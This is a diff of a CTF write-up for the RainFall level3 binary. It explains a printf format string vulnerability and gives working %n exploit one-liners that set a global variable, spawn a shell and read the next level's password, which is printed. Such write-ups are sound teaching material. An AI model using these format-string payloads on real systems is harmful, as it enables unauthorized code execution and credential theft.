@@ -1,6 +1,6 @@
 # Level 3
 
-- Once logged in, you will see a binary `level3`
+Once logged in, you will see a binary `level3`.
 
 ```
 [???] $ ssh level3@localhost -p 4242
@@ -28,13 +28,14 @@ level3@RainFall:~$ ls
 level3
 ```
 
-let's run this and see what this does
+Let's run this and see what this does.
+
 ```
 level3@RainFall:~$ ./level3
 
 ```
 
-okay, this one does the same behavior as level2
+This one does the same behavior as level2.
 
 ```
 level3@RainFall:~$ ./level3
@@ -43,7 +44,7 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 level3@RainFall:~$
 ```
 
-Now let's take a look at the binary
+Now let's take a look at the binary.
 
 ```
 gdb-peda$ disass main
@@ -57,7 +58,7 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-take a look at v
+Let's take a look at the function `v`.
 
 ```
 Dump of assembler code for function v:
@@ -90,9 +91,9 @@ Dump of assembler code for function v:
    0x08048519 <+117>:   ret
 ```
 
-On line <+59>, if a value stored in eax is stored 0x40 is not equal, it will jump to <v+116>, otherwise `fwrite` and `system` function will be executed.
+On line `<+59>`, if a value stored in eax is stored 0x40 is not equal, it will jump to `<v+116>`, otherwise `fwrite` and `system` function will be executed.
 
-below are the strings stored in the address relavent to the `fwrite` and `system`
+Below are the strings stored in the address relevant to the `fwrite` and `system`:
 ```
 gdb-peda$ x/s 0x8048600
 0x8048600:       "Wait what?!\n"
@@ -100,13 +101,11 @@ gdb-peda$ x/s 0x804860d
 0x804860d:       "/bin/sh"
 ```
 
-In order to execute, a `format string vulnerability` will be used, as the function `printf` is used.
-But what is `format string vulnerability` and why all of the sudden `printf` is mentioned?
+In order to exploit this program, a "format string vulnerability" will be used, as the function `printf` is used. But what is `format string vulnerability` and why all of the sudden `printf` is mentioned?
 
-- https://www.youtube.com/watch?v=0WvrSfcdq1I (nees to write)
+This [video](https://www.youtube.com/watch?v=0WvrSfcdq1I) does a great job at explaining how a format string vulnerability is exploited.
 
-
-on line <+54>, we can see the value `0x40` is compared with the valune on the address `0x804988c`, the variable `m`
+On line `<+54>`, we can see the value `0x40` is compared with the value in the address `0x804988c`, the variable `m`.
 
 ```
 gdb-peda$ info variables
@@ -136,15 +135,14 @@ Non-debugging symbols:
 0x0804988c  m
 ```
 
-and if only format string is passed, it causes the segmentation fault
-
+If we try to pass in `%s` to the string format, it cases a segmentation fault.
 ```
 level3@RainFall:~$ ./level3
 %s
 Segmentation fault (core dumped)
 ```
 
-what if we pass `%x` into the input?
+What if we pass `%x` into the input?
 
 ```
 level3@RainFall:~$ ./level3
@@ -152,37 +150,38 @@ level3@RainFall:~$ ./level3
 200
 ```
 
-as explained from above, if format string is passed into the variable, we can easily get the address of the stack
+As explained from above, if format string is passed into the variable, we can easily get the address of the stack.
 
 ```
 level3@RainFall:~$ echo "%x %x %x %x" | ./level3
 200 b7fd1ac0 b7ff37d0 25207825
 ```
 
-The goal of this level is to find a offset where we reach the address of the variable we want to modify, so we need to see in which address our buffer is wrote
+The goal of this level is to find an offset where we reach the address of the variable we want to modify, so we need to see in which address our buffer is written.
 
 ```
 $ echo "AAAA %x %x %x %x %x %x" | ./level3
 AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
 ````
 
-we can see the offset of AAAA is 4, but noe we need to change this to the address of `m`
+We can see the offset of `AAAA` is 4 pointers (16 bytes), but now we need to change this to the address of `m`.
 
-lastly, we just want to change the content of the variable m. Remember, the global variable m needs to have a size of 64
+Lastly, we need to change the content of the variable m. Remember, the global variable `m` needs to have a size of 64. We accomplish this by using the `%n` modifier available in `printf`. This modifier sets the variable referenced by a provided pointer in arguments (or not provided in our case) to the number of characters printed so far.
+
+In the following Python we print 64 characters and then put the `%n` with the `4$` modifier that tells `printf` to use the "fourth argument passed in". (This fourth argument isn't really passed in, but the program doesn't know that as those errors are caught in compile-time.)
 
 ```
-address of m : 4 bytes
-pad of arbitrary data : 60 bytes
-modifier %n
-```
-
 level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' ; cat -) | ./level3
-
-```
-
 �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Wait what?!
 cat /home/user/level4/.pass
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
 
+One interesting trick to try with this exploit: you can move around which `printf` argument it looks at by moving the exploit address around by multiples of 4, so the following exploits all work:
+
+```
+(python -c 'print "A" * 0 + "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' ; cat -) | ./level3
+(python -c 'print "A" * 4 + "\x8c\x98\x04\x08" + "A" * 56 + "%5$n"' ; cat -) | ./level3
+(python -c 'print "A" * 8 + "\x8c\x98\x04\x08" + "A" * 52 + "%6$n"' ; cat -) | ./level3
+```
